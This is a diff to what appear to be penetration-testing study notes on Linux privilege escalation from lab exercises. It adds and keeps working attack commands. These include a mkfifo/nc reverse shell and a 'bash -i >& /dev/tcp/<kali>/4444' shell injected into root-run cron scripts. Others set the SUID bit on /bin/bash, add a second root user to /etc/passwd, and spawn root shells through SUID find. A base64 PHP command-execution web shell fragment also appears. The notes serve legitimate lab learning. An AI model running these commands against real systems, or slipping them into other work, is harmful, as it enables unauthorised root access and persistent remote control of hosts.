@@ -966,13 +966,18 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - transfer linpeas.sh and execute
     ```
     #kali
-    scp linpeas.sh user@target
+    scp linpeas.sh <user>@<target>
+    scp -P 2222 linpeas.sh <user>@<target>:/tmp/
     wget http://<kali>/linpeas.sh -O linpeas.sh
     wget https://github.com/peass-ng/PEASS-ng/releases/download/20250801-03e73bf3/linpeas.sh
 
     #target
     chmod +x linpeas.sh
     ./linpeas.sh | tee linpeas_output.txt
+
+    #transfer back
+    scp student@192.168.196.52:2222:/home/student/linpeas_output.txt /home/kali/share/results/   #default port 22
+    scp -P 2222 student@192.168.196.52:/home/student/linpeas_output.txt /home/kali/share/results/ #non standard port
     ```
   - Analyze red/yellow font
     - `grep -E "WARNING|CRITICAL|SUID|password|sudo" linpeas.txt`
@@ -1051,6 +1056,14 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     echo >> user_backups.sh
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> user_backups.sh
     ```
+    ```
+    #nano archiver.sh
+    bash -i >& /dev/tcp/<kali>/4444 0>&1
+
+    #add SUID bit to execute with root privilege
+    echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
+    ```
+    `echo "chmod u+s /bin/bash" >> /var/archives/archive.sh`  
 - Password Authentication
   - edit /etc/passwd (add new superuser "root2")  
     ```
@@ -1059,9 +1072,10 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     joe@debian-privesc:~$ su root2
     root@debian-privesc:/home/joe# id
     ```
-- Setuid
+- Setuid  
   - **Enumerate SUID**  
-    `find / -perm -4000 -type f 2>/dev/null`   
+    `find / -perm -4000 -type f 2>/dev/null`  
+    look for find, vim, less, bash, perl, python, nmap, tar, cp  
   - Check Binary against [GTFOBins](https://gtfobins.github.io/)  
   - Get a root shell by abusing SUID program  
     `joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`
